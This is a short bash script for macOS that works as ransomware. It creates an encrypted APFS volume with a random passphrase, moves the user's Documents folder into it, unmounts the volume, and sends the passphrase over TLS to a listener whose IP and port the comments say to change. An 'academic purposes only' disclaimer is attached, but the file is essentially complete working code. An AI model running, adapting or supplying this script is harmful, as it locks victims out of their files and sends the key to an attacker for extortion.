#! /usr/bin/env bash
sh -c 'p=$(head -n 1024 /dev/urandom | strings| grep -o "[[:alnum:]]" | head -n 64| tr -d "\n");disk_name=$(diskutil info / | grep "APFS Container:" | tr -s " "| cut -d" " -f4);diskutil apfs addVolume "${disk_name}" APFS XX -passphrase "${p}";mv -f ~/Documents/* /Volumes/XX;diskutil umount XX;echo $p | timeout 2 openssl s_client -quiet -connect 127.0.0.1:9001 2>/dev/null;p="";'

# Change the IP address and Port number
# Use chmod +x <name>.sh to make the script executable
# With OpenSSL

# License: This script is free to use. Do not use for illegal purposes. Only use for academic purposes, on computers that you have permission to access.
